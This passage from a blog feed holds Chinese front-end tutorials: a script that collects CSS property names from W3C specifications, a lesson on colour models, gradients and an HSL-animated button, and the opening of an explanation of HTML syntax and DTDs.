class="string">&quot;textEmphasisPosition&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textEmphasisStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textIndent&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textOrientation&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textOverflow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textRendering&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textShadow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textSizeAdjust&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textTransform&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textUnderlineOffset&quot;</span>,</span><br><span class="line">    <span class="string">&quot;textUnderlinePosition&quot;</span>,</span><br><span class="line">    <span class="string">&quot;top&quot;</span>,</span><br><span class="line">    <span class="string">&quot;touchAction&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transform&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transformBox&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transformOrigin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transformStyle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transition&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transitionDelay&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transitionDuration&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transitionProperty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;transitionTimingFunction&quot;</span>,</span><br><span class="line">    <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;unicodeBidi&quot;</span>,</span><br><span class="line">    <span class="string">&quot;unicodeRange&quot;</span>,</span><br><span class="line">    <span class="string">&quot;userSelect&quot;</span>,</span><br><span class="line">    <span class="string">&quot;vectorEffect&quot;</span>,</span><br><span class="line">    <span class="string">&quot;verticalAlign&quot;</span>,</span><br><span class="line">    <span class="string">&quot;viewTransitionName&quot;</span>,</span><br><span class="line">    <span class="string">&quot;visibility&quot;</span>,</span><br><span class="line">    <span class="string">&quot;whiteSpace&quot;</span>,</span><br><span class="line">    <span class="string">&quot;widows&quot;</span>,</span><br><span class="line">    <span class="string">&quot;width&quot;</span>,</span><br><span class="line">    <span class="string">&quot;willChange&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wordBreak&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wordSpacing&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wordWrap&quot;</span>,</span><br><span class="line">    <span class="string">&quot;writingMode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;y&quot;</span>,</span><br><span class="line">    <span class="string">&quot;zIndex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;zoom&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>数了一下，这里有 441 个属性(随着升级会越来越多)，这非常壮观了，要想了解它们可不是一件容易的事情。接下来我们试着找到它们背后对应的标准。</p><h2 id="小实验：找出-W3C-标准中的-CSS-属性"><a href="#小实验：找出-W3C-标准中的-CSS-属性" class="headerlink" title="小实验：找出 W3C 标准中的 CSS 属性"></a>小实验：找出 W3C 标准中的 CSS 属性</h2><p>我们知道 CSS2.1 是一份标准，但是 CSS3 分布在无数标准中，我们需要用代码把它们整理出来，这就是我们今天的小实验内容了。</p><p>为了达到我们的目的，我们需要写一个简单的爬虫，来找一找 W3C 标准中都覆盖了哪些属性。</p><p><strong>我们这个爬虫的思路是：用 iframe 来加载所有标准的网页，然后用 JavaScript 找出它们中间定义的属性。</strong></p><h3 id="第一步：找到-CSS-相关的标准。"><a href="#第一步：找到-CSS-相关的标准。" class="headerlink" title="第一步：找到 CSS 相关的标准。"></a>第一步：找到 CSS 相关的标准。</h3><p>我们来到 W3C 的 TR 页面：<a href="https://www.w3.org/TR/?tag=css">https://www.w3.org/TR/?tag=css</a></p><p>我们必须从这个页面里抓取所有的标准名称和链接，打开它的代码，我们会发现它是有规律的，这个页面由一个巨大的列表构成，我们只需要根据 tag 选取需要的标准即可。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document<span class="selector-class">.querySelectorAll</span>(&quot;<span class="selector-id">#container</span> <span class="selector-tag">li</span><span class="selector-attr">[data-tag~=css]</span> <span class="selector-tag">h2</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.Retired</span>)<span class="selector-pseudo">:not</span>(<span class="selector-class">.GroupNote</span>)&quot;)</span><br></pre></td></tr></table></figure><p>这段代码可以找到所有 CSS 相关的标准，我们用代码把从 HTML 结构中把它们抽取出来。可以得到一个列表。</p><p><img src="https://upload-images.jianshu.io/upload_images/5780538-c9d6e5cec23d621c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><h3 id="第二步：分析每个标准中的-CSS-属性"><a href="#第二步：分析每个标准中的-CSS-属性" class="headerlink" title="第二步：分析每个标准中的 CSS 属性"></a>第二步：分析每个标准中的 CSS 属性</h3><p>得到了这个标准的列表，下一步我们就是分析每个标准中的 CSS 属性。</p><p>我们打开第一个标准，试着找出属性定义：<a href="https://www.w3.org/TR/2019/WD-css-lists-3-20190425/">https://www.w3.org/TR/2019/WD-css-lists-3-20190425/</a></p><p>经过分析，我们会发现，属性总是在一个具有 propdef 的容器中，有属性 data-dfn-type 值为 property。</p><p>这里我不得不感慨，W3C 的标准写得真的是十分严谨，这给我们带来了很大的方便。我们用以下代码获取属性：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.<span class="built_in">querySelectorAll</span>(<span class="string">&quot;.propdef [data-dfn-type=property]&quot;</span>)</span><br></pre></td></tr></table></figure><p>对于第一个标准 CSS Lists Module Level 3 得到了这个列表：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list-style-image</span></span><br><span class="line"><span class="built_in">list-style-type</span></span><br><span class="line"><span class="built_in">list-style-position</span></span><br><span class="line"><span class="built_in">list-style</span></span><br><span class="line"><span class="string">marker-side</span></span><br><span class="line"><span class="string">counter-reset</span></span><br><span class="line"><span class="string">counter-set</span></span><br><span class="line"><span class="string">counter-increment</span></span><br></pre></td></tr></table></figure><p>好了，接下来，我们来用 iframe 打开这些标准，并且用我们分析好的规则，来找出里面的属性就可以了。最终成品代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span><br><span class="line"></span><br><span class="line">iframe.<span class="property">src</span> = <span class="string">&quot;https://www.w3.org/TR/2019/WD-css-lists-3-20190425/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">happen</span>(<span class="params">element, type</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    element.<span class="title function_">addEventListener</span>(type, resolve, &#123;<span class="attr">once</span>: <span class="literal">true</span>&#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">happen</span>(iframe, <span class="string">&quot;load&quot;</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">//Array.prototype.map.call(document.querySelectorAll(&quot;#container li[data-tag~=css] h2&quot;), e=&gt; e.children[0].href + &quot; |\t&quot; + e.children[0].textContent).join(&quot;\n&quot;)</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(iframe.<span class="property">contentWindow</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> output = []</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> standard <span class="keyword">of</span>  <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">slice</span>.<span class="title function_">call</span>(<span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;#container li[data-tag~=css] h2:not(.Retired):not(.GroupNote)&quot;</span>))) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(standard.<span class="property">children</span>[<span class="number">0</span>].<span class="property">href</span>);</span><br><span class="line">    iframe.<span class="property">src</span> = standard.<span class="property">children</span>[<span class="number">0</span>].<span class="property">href</span>;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">happen</span>(iframe, <span class="string">&quot;load&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> properties = <span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">map</span>.<span class="title function_">call</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;.propdef [data-dfn-type=property]&quot;</span>), <span class="function"><span class="params">e</span> =&gt;</span> e.<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">textContent</span>);</span><br><span class="line">    <span class="keyword">if</span>(properties.<span class="property">length</span>)</span><br><span class="line">        output.<span class="title function_">push</span>(standard.<span class="property">children</span>[<span class="number">0</span>].<span class="property">textContent</span> + <span class="string">&quot; | &quot;</span> + properties.<span class="title function_">join</span>(<span class="string">&quot;, &quot;</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(output.<span class="title function_">join</span>(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">start</span>();</span><br></pre></td></tr></table></figure><p>这样，我们就得到了每个属性属于哪个标准，我们来看看最终结果。我把它整理成了一个列表。</p><p><img src="/Blog/2019/01/30/relearn_FE/24%E4%B8%A8HTML&CSS%EF%BC%9A%E7%94%A8%E4%BB%A3%E7%A0%81%E6%8C%96%E6%8E%98CSS%E5%B1%9E%E6%80%A7/index/img.png"></p><p>至此，我们已经找出了标准中讲解的所有属性。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>23丨HTML&amp;CSS：CSS渲染</title>
      <link href="/Blog/2019/01/30/relearn_FE/23%E4%B8%A8HTML&amp;CSS%EF%BC%9ACSS%E6%B8%B2%E6%9F%93/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/23%E4%B8%A8HTML&amp;CSS%EF%BC%9ACSS%E6%B8%B2%E6%9F%93/index/</url>
      
        <content type="html"><![CDATA[<h2 id="颜色的原理"><a href="#颜色的原理" class="headerlink" title="颜色的原理"></a>颜色的原理</h2><p>首先我们来讲讲颜色，最常见的颜色相关的属性就是 color 和 background-color。</p><p>这两个属性没什么好讲的，它们分别表示文字颜色和背景颜色，我们这里重点讲讲颜色值。</p><h3 id="RGB-颜色"><a href="#RGB-颜色" class="headerlink" title="RGB 颜色"></a>RGB 颜色</h3><p>我们在计算机中，最常见的颜色表示法是 RGB 颜色，<strong>它符合光谱三原色理论：红、绿、蓝三种颜色的光可以构成所有的颜色。</strong></p><p><img src="/Blog/2019/01/30/relearn_FE/23%E4%B8%A8HTML&CSS%EF%BC%9ACSS%E6%B8%B2%E6%9F%93/index/img.png"></p><p>为什么是这三种颜色呢？这跟人类的视神经系统相关，人类的视觉神经分别有对红、绿、蓝三种颜色敏感的类型。</p><p>顺便提一下，人类对红色的感觉最为敏感，所以危险信号提示一般会选择红色；而红绿色盲的人，就是红和绿两种神经缺失一种。其它的动物视觉跟人可能不太一样，比如皮皮虾拥有 16 种视锥细胞，所以我猜它们看到的世界一定特别精彩。</p><p>现代计算机中多用 0 - 255 的数字表示每一种颜色，这正好占据了一个字节，每一个颜色就占据三个字节。</p><p>这个数字远远超过了人体的分辨能力，因此，上世纪 90 年代刚推出这样的颜色系统的时候，它被称作真彩色。早年间还有更节约空间，但是精度更低的 16 色、256 色、8 位色和 16 位色表示法。</p><p>红绿蓝三种颜色的光混合起来就是白光，没有光就是黑暗，所以在 RGB 表示法中，三色数值最大表示白色，三色数值为 0 表示黑色。</p><h3 id="CMYK-颜色"><a href="#CMYK-颜色" class="headerlink" title="CMYK 颜色"></a>CMYK 颜色</h3><p>如果你上过小学美术课，应该听过“红黄蓝”三原色的说法，这好像跟我们说的不太一样。实际上是这样的，颜料显示颜色的原理是它吸收了所有别的颜色的光，只反射一种颜色，所以颜料三原色其实是红、绿、蓝的补色，也就是：品红、黄、青。因为它们跟红、黄、蓝相近，所以有了这样的说法。</p><p><img src="/Blog/2019/01/30/relearn_FE/23%E4%B8%A8HTML&CSS%EF%BC%9ACSS%E6%B8%B2%E6%9F%93/index/img_1.png"></p><p>在印刷行业，使用的就是这样的三原色（品红、黄、青）来调配油墨，这种颜色的表示法叫做 CMYK，它用一个四元组来表示颜色。</p><p>你一定会好奇，为什么它比三原色多了一种，其实答案并不复杂，在印刷行业中，黑色颜料价格最低，而品红、黄、青颜料价格较贵，如果要用三原色调配黑色，经济上是不划算的，所以印刷时会单独指定黑色。</p><p>对 CMYK 颜色表示法来说，同一种颜色会有多种表示方案，但是我们参考印刷行业的习惯，会尽量优先使用黑色。</p><h3 id="HSL-颜色"><a href="#HSL-颜色" class="headerlink" title="HSL 颜色"></a>HSL 颜色</h3><p>好了，讲了这么多，其实还没有涉及今天的主角：HSL 颜色。接下来我们就讲一讲。</p><p>我们刚才讲的颜色是从人类的视觉原理建模，应该说是十分科学了。但是，人类对颜色的认识却并非来自自己的神经系统，当我们把阳光散射，可以得到七色光：红橙黄绿蓝靛紫，实际上，阳光接近白光，它包含了各种颜色的光，它散射之后，应该是个基本连续的。这说明对人的感知来说，颜色远远大于红、绿、蓝。</p><p>因此，HSL 这样的颜色模型被设计出来了，它用一个值来表示人类认知中的颜色，我们用专业的术语叫做色相（H）。加上颜色的纯度（S）和明度（L），就构成了一种颜色的表示。</p><p><img src="/Blog/2019/01/30/relearn_FE/23%E4%B8%A8HTML&CSS%EF%BC%9ACSS%E6%B8%B2%E6%9F%93/index/img_2.png"></p><p>在这里，我需要特别推荐 HSL 颜色，因为它是一种语义化的颜色。当我们对一张图片改变色相时，人们感知到的是“图片的颜色变了”。这里先容我卖个关子，具体的例子待我们讲完了渐变再看。</p><h2 id="其它颜色"><a href="#其它颜色" class="headerlink" title="其它颜色"></a>其它颜色</h2><p>接下来我们讲一讲 RGBA，RGBA 是代表 Red（红色）、Green（绿色）、Blue（蓝色）和 Alpha 的色彩空间。RGBA 颜色被用来表示带透明度的颜色，实际上，Alpha 通道类似一种颜色值的保留字。在 CSS 中，Alpha 通道被用于透明度，所以我们的颜色表示被称作 RGBA，而不是 RGBO（Opacity）。</p><p>为了方便使用，CSS 还规定了名称型的颜色，它内置了大量（140 种）的颜色名称。不过这里我要挑出两个颜色来讲一讲：金（gold）和银（silver）。</p><p>如果你使用过这两个颜色，你会发现，金（gold）和银（silver）的视觉表现跟我们想象中的金色和银色相差甚远。与其被叫做金色和银色，它们看起来更像是难看的暗黄色和浅灰色。</p><p>为什么会这样呢？在人类天然的色彩认知中，实际上混杂了很多其它因素，金色和银色不仅仅是一种颜色，它还意味着一定的镜面反光程度，在同样的光照条件下，金属会呈现出更亮的色彩，这并非是用一个色值可以描述的，这就引出了我们接下来要讲的渐变。</p><h2 id="渐变"><a href="#渐变" class="headerlink" title="渐变"></a>渐变</h2><p>在 CSS 中，background-image这样的属性，可以设为渐变。CSS 中支持两种渐变，一种是线性渐变，一种是放射性渐变，我们先了解一下它们的基本用法：</p><p>线性渐变的写法是：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linear-gradient(<span class="attribute">direction</span>, <span class="attribute">color</span>-stop1, <span class="attribute">color</span>-stop2, ...);</span><br></pre></td></tr></table></figure><p>这里的 direction 可以是方向，也可以是具体的角度。例如：</p><ul><li>to bottom</li><li>to top</li><li>to left</li><li>to right</li><li>to bottom left</li><li>to bottom right</li><li>to top left</li><li>to top right</li><li>120deg</li><li>3.14rad</li></ul><p>以上这些都是合理的方向取值。</p><p>color-stop 是一个颜色和一个区段，例如：</p><ul><li>rgba(255,0,0,0)</li><li>orange</li><li>yellow 10%</li><li>green 20%</li><li>lime 28px</li></ul><p>我们组合一下，产生一个“真正的金色”的背景：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-id">#grad1</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">height</span>: <span class="number">200px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">45deg</span>, gold <span class="number">10%</span>, yellow <span class="number">50%</span>, gold <span class="number">90%</span>); </span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;grad1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>放射性渐变需要一个中心点和若干个颜色：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">radial-gradient(shape size <span class="built_in">at</span> <span class="built_in">position</span>, start-<span class="built_in">color</span>, ..., <span class="built_in">last</span>-<span class="built_in">color</span>);</span><br></pre></td></tr></table></figure><p>当我们应用的每一种颜色都是 HSL 颜色时，就产生了一些非常有趣的效果，比如，我们可以通过变量来调整一个按钮的风格：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.button</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">outline</span>: none;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font</span>: <span class="number">14px</span>/<span class="number">100%</span> Arial, Helvetica, sans-serif;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: .<span class="number">5em</span> <span class="number">2em</span> .<span class="number">55em</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">1px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">3</span>);</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-radius</span>: .<span class="number">5em</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">1px</span> <span class="number">2px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">2</span>);</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: solid <span class="number">1px</span> ;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;button orange&quot;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.button&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> h = <span class="number">25</span>;</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  h ++;</span><br><span class="line">  h = h % <span class="number">360</span>;</span><br><span class="line">  btn.<span class="property">style</span>.<span class="property">borderColor</span>=<span class="string">`hsl(<span class="subst">$&#123;h&#125;</span>, 95%, 45%)`</span></span><br><span class="line">  btn.<span class="property">style</span>.<span class="property">background</span>=<span class="string">`linear-gradient(to bottom,  hsl(<span class="subst">$&#123;h&#125;</span>,95%,54.1%),  hsl(<span class="subst">$&#123;h&#125;</span>,95%,84.1%))`</span></span><br><span class="line">&#125;,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><h2 id="形状"><a href="#形状" class="headerlink" title="形状"></a>形状</h2><p>CSS 中的很多属性还会产生形状，比如我们常见的属性：</p><ul><li>border</li><li>box-shadow</li><li>border-radius</li></ul><p>这些产生形状的属性非常有趣，我们也能看到很多利用它们来产生的 CSS 黑魔法。然而，这里我有一个相反的建议，我们仅仅把它们用于基本的用途，把 border 用于边框、把阴影用于阴影，把圆角用于圆角，所有其它的场景，都有一个更好的替代品：datauri+svg。</p>]]></content>
      
      
      <categories>
          
          <category> relearnFE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>22丨HTML&amp;CSS：HTML语言DTD到底是什么？</title>
      <link href="/Blog/2019/01/30/relearn_FE/22%E4%B8%A8HTML&amp;CSS%EF%BC%9AHTML%E8%AF%AD%E8%A8%80DTD%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/index/"/>
      <url>/Blog/2019/01/30/relearn_FE/22%E4%B8%A8HTML&amp;CSS%EF%BC%9AHTML%E8%AF%AD%E8%A8%80DTD%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>在上世纪 80 年代，“富文本”的概念在计算机领域的热门，犹如如今的“AI”和“区块链”，而 Tim Berners-Lee 当时去设计 HTML，也并非是凭空造出来，他使用了当时已有的一种语言：SGML。</p><p>SGML 是一种古老的标记语言，可以追溯到 1969 年 IBM 公司所使用的技术，SGML 十分复杂，严格来说，HTML 是 SGML 中规定的一种格式，但是实际的浏览器没有任何一个是通过 SGML 引擎来解析 HTML 的。</p><p>今天的 HTML 仍然有 SGML 的不少影子，那么接下来我们就从 SGML 的一些特性来学习一下 HTML。这里我最想讲的是 SGML 留给 HTML 的重要的遗产：基本语法和 DTD。</p></blockquote><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>首先，HTML 作为 SGML 的子集，它遵循 SGML 的基本语法：包括标签、转义等。</p><p>SGML 还规定了一些特殊的节点类型，在我们之前的 DOM 课程中已经讲过几种节点类型，它们都有与之对应的 HTML 语法，我们这里复习一下：</p><p><img src="/Blog/2019/01/30/relearn_FE/22%E4%B8%A8HTML&CSS%EF%BC%9AHTML%E8%AF%AD%E8%A8%80DTD%E5%88%B0%E5%BA%95%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/index/img.png"></p><p>这里我们从语法的角度，再逐个具体了解一下。</p><h2 id="标签语法"><a href="#标签语法" class="headerlink" title="标签语法"></a>标签语法</h2><p>标签语法产生元素，我们从语法的角度讲，就用“标签”这个术语，我们从运行时的角度讲，就用“元素”这个术语。</p><p>HTML 中，用于描述一个元素的标签分为开始标签、结束标签和自闭合标签。开始标签和自闭合标签中，又可以有属性。</p><ul><li>开始标签：&lt;tagname&gt;<ul><li>带属性的开始标签： &lt;tagname attributename&#x3D;”attributevalue”&gt;</li></ul></li><li>结束标签：&lt;/tagname&gt;</li><li>自闭合标签：&lt;tagname /&gt;</li></ul><p>HTML 中开始标签的标签名称只能使用英文字母。</p><p>这里需要重点讲一讲属性语法，属性可以使用单引号、双引号或者完全不用引号，这三种情况下，需要转义的部分都不太一样。</p><p>属性中可以使用文本实体（后文会介绍）来做转义，属性中，一定需要转义的有下面几种。</p><ul><li>无引号属性：&lt;tab&gt; &lt;LF&gt; &lt;FF&gt; &lt;SPACE&gt; &amp;五种字符。</li><li>单引号属性：&#39; &amp;两种字符。</li><li>双引号属性：&quot; &amp;两种字符。</li></ul><p>一般来说，灵活运用属性的形式，是不太用到文本实体转义的。</p><h2 id="文本语法"><a href="#文本语法" class="headerlink" title="文本语法"></a>文本语法</h2><p>在 HTML 中，规定了两种文本语法，一种是普通的文本节点，另一种是 CDATA 文本节点。</p><p>文本节点看似是普通的文本，但是，其中有两种字符是必须做转义的：&lt; 和 &amp;。</p><p>如果我们从某处拷贝了一段文本，里面包含了大量的 &lt; 和 &amp;，那么我们就有麻烦了，这时候，就轮到我们的 CDATA 节点出场了。</p><p>CDATA 也是一种文本，它存在的意义是语法上的意义：在 CDATA 节点内，不需要考虑多数的转义情况。</p><p>CDATA 内，只有字符组合]]&gt;需要处理，这里不能使用转义，只能拆成两个 CDATA 节点。</p><h2 id="注释语法"><a href="#注释语法" class="headerlink" title="注释语法"></a>注释语法</h2><p>HTML 注释语法以结尾，注释的内容非常自由，除了–&gt;都没有问题。</p><p>如果注释的内容一定要出现 –&gt;，我们可以拆成多个注释节点。</p><h2 id="DTD-语法（文档类型定义）"><a href="#DTD-语法（文档类型定义）" class="headerlink" title="DTD 语法（文档类型定义）"></a>DTD 语法（文档类型定义）</h2><p>SGML 的 DTD 语法十分复杂，但是对 HTML 来说，其实 DTD 的选项是有限的，浏览器在解析 DTD 时，把它当做几种字符串之一，关于 DTD，我在本篇文章的后面会详细讲解。</p><h2 id="ProcessingInstruction-语法（处理信息）"><a href="#ProcessingInstruction-语法（处理信息）" class="headerlink" title="ProcessingInstruction 语法（处理信息）"></a>ProcessingInstruction 语法（处理信息）</h2><p>ProcessingInstruction 多数情况下，是给机器看的。HTML 中规定了可以有 ProcessingInstruction，但是并没有规定它的具体内容，所以可以把它视为一种保留的扩展机制。对浏览器而言，ProcessingInstruction 的作用类似于注释。</p><p>ProcessingInstruction 包含两个部分，紧挨着第一个问号后，空格前的部分被称为“目标”，这个目标一般表示处理 ProcessingInstruction 的程序名。</p><p>剩余部分是它的文本信息，没有任何格式上的约定，完全由文档编写者和处理程序的编写者约定。</p><h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><p>现在我们来讲一下 DTD，DTD 的全称是 Document Type Definition，也就是文档类型定义。SGML 用 DTD 来定义每一种文档类型，HTML 属于 SGML，在 HTML5 出现之前，HTML 都是使用符合 SGML 规定的 DTD。</p><p>如果你是一个上个时代走过来的前端，一定还记得 HTML4.01 有三种 DTD。分别是严格模式、过渡模式和 frameset 模式。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>严格模式的 DTD 规定了 HTML4.01 中需要的标签。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>过渡模式的 DTD 除了 